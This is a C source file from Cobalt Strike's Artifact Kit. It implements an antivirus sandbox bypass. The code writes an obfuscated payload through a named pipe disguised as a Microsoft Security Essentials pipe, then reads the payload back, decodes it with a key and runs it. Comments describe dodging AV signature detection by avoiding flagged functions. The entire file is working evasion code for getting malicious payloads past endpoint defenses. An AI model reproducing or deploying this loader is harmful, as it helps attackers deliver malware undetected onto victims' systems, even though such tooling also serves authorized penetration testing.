/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2014 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 *
 * A/V sandbox bypass with named pipes.
 *
 * Strategy - feed obfuscated payload data through a named pipe before
 *            executing it. This will cause many A/V sandbox tools to
 *            give up on the binary.
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"

/* a place to track our random-ish pipe name */
char pipename[64];

void server(char * data, int length) {
	DWORD  wrote = 0;
	HANDLE pipe = CreateNamedPipeA(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, 0, 0, 0, NULL);

	if (pipe == NULL || pipe == INVALID_HANDLE_VALUE)
		return;

	BOOL result = ConnectNamedPipe(pipe, NULL);
	if (!result)
		return;

	while (length > 0) {
		result = WriteFile(pipe, data, length, &wrote, NULL);
		if (!result)
			break;

		data   += wrote;
		length -= wrote;
	}
	CloseHandle(pipe);
}

BOOL client(char * buffer, int length) {
	DWORD  read = 0;
	HANDLE pipe = CreateFileA(pipename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (pipe == INVALID_HANDLE_VALUE)
  	      return FALSE;

	while (length > 0) {
		BOOL result = ReadFile(pipe, buffer, length, &read, NULL);
		if (!result)
			break;

		buffer += read;
		length -= read;
	}

	CloseHandle(pipe);
	return TRUE;
}

DWORD server_thread(LPVOID whatever) {
	phear * payload = (phear *)data;

	/* setup a pipe for our payload */
	server(payload->payload, payload->length);

	return 0;
}

DWORD client_thread(LPVOID whatever) {
	phear * payload = (phear *)data;

	/* allocate data for our "cleaned" payload */
	char * buffer = (char *)malloc(payload->length);

	/* try to connect to the pipe */
	do {
		Sleep(1024);
	}
	while (!client(buffer, payload->length));

	/* spawn our payload */
	spawn(buffer, payload->length, payload->key);
	return 0;
}

void start(HINSTANCE mhandle) {
	/* switched from snprintf... as some A/V product was flagging based on the function *sigh* */
	sprintf(pipename, "%c%c%c%c%c%c%c%c%cMSSE-%d-server", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));

	/* start our server and our client */
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&server_thread, (LPVOID) NULL, 0, NULL);
	client_thread(NULL);
}
